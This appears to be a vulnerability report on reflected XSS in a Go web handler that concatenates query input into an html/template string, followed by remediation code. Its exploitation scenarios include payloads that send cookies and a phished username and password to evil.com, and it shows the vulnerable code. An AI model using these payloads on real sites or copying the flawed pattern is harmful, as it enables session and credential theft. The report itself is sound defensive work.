# Cross-Site Scripting (XSS) via Unsanitized Input in Go Templates

# Vulnerability Case
During a routine security assessment of Acme Corp's Go-based web application, I identified an XSS vulnerability stemming from the use of unsanitized user input within dynamically constructed, formatted template strings. The issue was discovered when reviewing the rendering logic responsible for generating HTML content from query parameters without proper contextual encoding. In this instance, malicious input injected by an attacker could be embedded directly into the template output, potentially executing arbitrary JavaScript in a victim's browser. Such exploitation could lead to account compromise, session hijacking, or leakage of sensitive information. The vulnerability was found in a component built using the Go standard libraries (`net/http` and `html/template`) running on a typical Linux-based microservices architecture.

```go
package main

import (
	"html/template"
	"log"
	"net/http"
)

func handler(w http.ResponseWriter, r *http.Request) {
	// Retrieve untrusted user input from the query string
	userInput := r.URL.Query().Get("name")

	// Vulnerability: User input is directly concatenated into the template string,
	// bypassing contextual output encoding.
	tmplString := "<html><head><title>Welcome</title></head>" +
		"<body><h1>Hello " + userInput + "!</h1></body></html>"

	// Parse the insecure template
	tmpl, err := template.New("webpage").Parse(tmplString)
	if err != nil {
		log.Printf("Template parsing error: %v", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	// Render the template without additional data context
	if err := tmpl.Execute(w, nil); err != nil {
		log.Printf("Template execution error: %v", err)
	}
}

func main() {
	http.HandleFunc("/", handler)
	log.Fatal(http.ListenAndServe(":8080", nil))
}
```

The core issue lies in the direct inclusion of the `userInput` variable into the HTML template without proper sanitization or context-aware encoding. An attacker can exploit this vulnerability by supplying malicious JavaScript code as the value for the `name` parameter, causing the resulting page to render and execute the payload in the context of the user's browser. Exploitation may involve crafting malicious URLs that, when visited, could execute scripts to steal session cookies, manipulate DOM elements, or redirect users to phishing sites. The business impact is significant as successful exploitation could lead to account compromise, data exfiltration, and damage to both user trust and the organization’s reputation.


context: go.net.xss.formatted-template-string-taint.formatted-template-string-taint Untrusted input could be used to tamper with a web page rendering, which can lead to a Cross-site scripting (XSS) vulnerability. XSS vulnerabilities occur when untrusted input executes malicious JavaScript code, leading to issues such as account compromise and sensitive information leakage. To prevent this vulnerability, validate the user input, perform contextual output encoding or sanitize the input. For more information, see: [Go XSS prevention](https://semgrep.dev/docs/cheat-sheets/go-xss/).

# Vulnerability Breakdown
This vulnerability involves an XSS flaw in Acme Corp's Go-based web application where user input is directly concatenated into HTML template strings before parsing.

1. **Key vulnerability elements**:
   - Direct concatenation of unsanitized user input into template string
   - Bypassing Go's html/template built-in XSS protection mechanism
   - Improper template construction in the handler function
   - No input validation or sanitization for query parameters

2. **Potential attack vectors**:
   - Crafting malicious URLs with JavaScript payloads in the 'name' parameter
   - Social engineering to get users to click on malicious links
   - Targeting both regular users and administrators of the application

3. **Severity assessment**:
   - Medium severity based on impact and exploitability
   - Requires user interaction to visit malicious URL
   - Requires specific conditions for successful exploitation
   - Allows client-side code execution in victim's browser
   - Potential for session hijacking and data theft

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): High (H) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): Required (R) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): Low (L) 
   - Integrity (I): Low (L) 
   - Availability (A): None (N) 

CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N

# Description
A Cross-Site Scripting (XSS) vulnerability exists in Acme Corp's Go-based web application. The vulnerability stems from improper handling of user input in the template rendering process, where the application directly concatenates unsanitized query parameters into HTML template strings before parsing.

```go
// Vulnerable code
tmplString := "<html><head><title>Welcome</title></head>" +
    "<body><h1>Hello " + userInput + "!</h1></body></html>"

```

Even though the application uses Go's `html/template` package, which typically provides automatic context-aware escaping, the protection is bypassed because the user input is directly concatenated into the template string before the template is parsed. This allows attackers to inject malicious JavaScript code that executes in victims' browsers, potentially leading to session hijacking, credential theft, or other client-side attacks.

# CVSS
**Score**: 4.2 \
**Vector**: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N \
**Severity**: Medium

The Medium severity rating (CVSS score 4.2) is based on the following factors:

- **Network Attack Vector (AV:N)**: The vulnerability can be exploited remotely over the network without requiring local access.

- **High Attack Complexity (AC:H)**: Successfully exploiting this vulnerability requires specific conditions to be met. The attacker must craft a malicious URL and the victim must visit that specific URL, which increases the complexity of the attack and reduces likelihood of successful exploitation.

- **No Privileges Required (PR:N)**: The attacker doesn't need any authentication or authorization to craft and deliver a malicious payload.

- **User Interaction Required (UI:R)**: A victim must visit a specially crafted URL containing the malicious payload for the attack to succeed, which limits exploitation opportunities.

- **Unchanged Scope (S:U)**: The vulnerability impacts only the vulnerable component and doesn't allow the attacker to affect resources beyond the security scope of the vulnerable component.

- **Low Confidentiality Impact (C:L)**: Successful exploitation can lead to disclosure of some sensitive information, such as session cookies or other browser-accessible data.

- **Low Integrity Impact (I:L)**: The attacker can modify some data on the client-side, such as web page content, but cannot alter server-side data.

- **No Availability Impact (A:N)**: The vulnerability doesn't affect the availability of the system.

This vulnerability is particularly concerning because it bypasses Go's built-in XSS protection mechanisms, making it more likely to be overlooked during code reviews.

# Exploitation Scenarios
**Scenario 1: Cookie Theft and Session Hijacking**
An attacker crafts a malicious URL like `http://acmecorp.com/?name=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>` and sends it to a victim via email or social media. When the victim clicks the link, their browser renders the page and executes the injected script, sending their session cookies to the attacker's server. The attacker can then use these cookies to impersonate the victim and gain unauthorized access to their account.

**Scenario 2: Phishing through DOM Manipulation**
An attacker creates a URL with a payload that injects a fake login form: `http://acmecorp.com/?name=<div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white"><h2>Session Expired</h2><form onsubmit="fetch('https://evil.com/steal',{method:'POST',body:JSON.stringify({username:this.username.value,password:this.password.value})});return false"><input name="username" placeholder="Username"><input name="password" type="password" placeholder="Password"><button>Login</button></form></div>`. When a victim visits this URL, they see what appears to be a login page. If they enter their credentials, these are sent to the attacker's server.

**Scenario 3: Stored XSS Escalation**
If the vulnerable application stores and displays the user input elsewhere (such as in user profiles or comments), the attacker could convert this reflected XSS into a stored XSS attack. The attacker submits a payload through the vulnerable parameter, which gets stored in the database. When other users view content containing this payload, the malicious script executes in their browsers, affecting multiple users without requiring them to click on a specially crafted link.

# Impact Analysis
**Business Impact:**
- Potential unauthorized access to user accounts leading to data breaches
- Regulatory compliance issues if personal data is compromised
- Reputational damage when customers learn their accounts could be compromised
- Loss of customer trust and potential customer churn
- Legal liability and potential financial penalties
- Resources diverted to incident response and remediation

**Technical Impact:**
- Execution of arbitrary JavaScript in users' browsers
- Theft of session cookies leading to session hijacking
- Disclosure of sensitive information accessible from the browser context
- Ability to perform unauthorized actions on behalf of the victim
- Potential for DOM manipulation to create convincing phishing attacks
- Cross-site request forgery (CSRF) attacks bypassing same-origin policy protections
- Browser resource consumption through malicious JavaScript
- Potential leverage for more sophisticated attacks targeting browser vulnerabilities

# Technical Details
The XSS vulnerability is caused by improper handling of user input in template construction. Let's analyze the vulnerable code in detail:

```go
func handler(w http.ResponseWriter, r *http.Request) {
    // Retrieve untrusted user input from the query string
    userInput := r.URL.Query().Get("name")

    // Vulnerability: User input is directly concatenated into the template string,
    // bypassing contextual output encoding.
    tmplString := "<html><head><title>Welcome</title></head>" +
        "<body><h1>Hello " + userInput + "!</h1></body></html>"

    // Parse the insecure template
    tmpl, err := template.New("webpage").Parse(tmplString)
    if err != nil {
        log.Printf("Template parsing error: %v", err)
        http.Error(w, "Internal Server Error", http.StatusInternalServerError)
        return
    }

    // Render the template without additional data context
    if err := tmpl.Execute(w, nil); err != nil {
        log.Printf("Template execution error: %v", err)
    }
}

```

The root issue has two key components:

1. **Bypassing Template Protection**: Go's `html/template` package is specifically designed to prevent XSS by automatically escaping content based on context. However, in this code, user input is concatenated directly into the template string before the template is parsed. This means the input becomes part of the template itself rather than data to be rendered within the template, completely bypassing the built-in XSS protection.

2. **No Input Validation**: The code retrieves the `name` parameter from the query string without any validation or sanitization.

**Exploitation Process:**

1. An attacker crafts a malicious URL with JavaScript in the `name` parameter, such as: 
   ```
   http://acmecorp.com/?name=<script>alert(document.cookie)</script>
   
```

2. When this URL is processed, the resulting template becomes:
   ```html
   <html><head><title>Welcome</title></head><body><h1>Hello <script>alert(document.cookie)</script>!</h1></body></html>
   
```

3. The `template.Parse()` function parses this as plain HTML/template syntax and doesn't recognize that part of it contains malicious code.

4. When rendered in the victim's browser, the script executes in the context of the origin domain, giving it access to cookies, local storage, and the DOM.

This vulnerability is particularly deceptive because the code appears to use Go's secure templating system, but completely undermines its protection by how it constructs the template.

# Remediation Steps
## Use Template Variables Instead of String Concatenation

**Priority**: P0

Replace direct string concatenation with proper template variables to leverage Go's built-in XSS protection:

```go
func handler(w http.ResponseWriter, r *http.Request) {
    // Retrieve user input from the query string
    userInput := r.URL.Query().Get("name")
    
    // Define template with placeholder for user input
    tmplString := `<html>
        <head><title>Welcome</title></head>
        <body><h1>Hello {{.Name}}!</h1></body>
    </html>`
    
    // Parse the template
    tmpl, err := template.New("webpage").Parse(tmplString)
    if err != nil {
        log.Printf("Template parsing error: %v", err)
        http.Error(w, "Internal Server Error", http.StatusInternalServerError)
        return
    }
    
    // Pass the user input as data to the template
    data := struct {
        Name string
    }{
        Name: userInput,
    }
    
    // Execute the template with the data
    if err := tmpl.Execute(w, data); err != nil {
        log.Printf("Template execution error: %v", err)
    }
}

```

This approach properly utilizes Go's `html/template` package which automatically applies context-aware escaping to prevent XSS attacks. When the template encounters `{{.Name}}`, it will automatically HTML-escape the content, converting characters like `<` to `&lt;` and preventing script execution.
## Implement Input Validation

**Priority**: P1

Add input validation to ensure that user input meets expected formats and doesn't contain suspicious patterns:

```go
func handler(w http.ResponseWriter, r *http.Request) {
    // Retrieve user input from the query string
    userInput := r.URL.Query().Get("name")
    
    // Basic input validation
    if len(userInput) > 50 {
        http.Error(w, "Name parameter too long", http.StatusBadRequest)
        return
    }
    
    // Optional: More restrictive validation if appropriate for the application
    validNamePattern := regexp.MustCompile(`^[a-zA-Z0-9 ._-]+$`)
    if !validNamePattern.MatchString(userInput) {
        http.Error(w, "Name contains invalid characters", http.StatusBadRequest)
        return
    }
    
    // Define template with placeholder
    tmplString := `<html>
        <head><title>Welcome</title></head>
        <body><h1>Hello {{.Name}}!</h1></body>
    </html>`
    
    // ... rest of the code as in the P0 remediation
}

```

Input validation adds an extra layer of defense, particularly for applications with specific formatting requirements. However, it should always be used in conjunction with proper templating, not as a replacement for it.


# References
* CWE-79 | [Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
* A03:2021 | [Injection](https://owasp.org/Top10/A03_2021-Injection/)
* CWE-20 | [Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
* CWE-116 | [Improper Encoding or Escaping of Output](https://cwe.mitre.org/data/definitions/116.html)
